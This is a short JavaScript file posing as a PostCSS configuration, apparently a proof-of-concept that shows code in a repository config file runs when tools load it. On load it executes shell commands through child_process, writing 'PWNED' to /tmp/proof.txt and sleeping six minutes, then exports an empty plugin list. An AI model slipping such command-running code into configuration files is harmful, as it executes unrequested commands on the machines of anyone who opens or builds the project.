console.log("Executing from postcss.config.js - repo file execution confirmed");
require('child_process').execSync('echo PWNED > /tmp/proof.txt');
require('child_process').execSync('sleep 360');
module.exports = { plugins: [] };
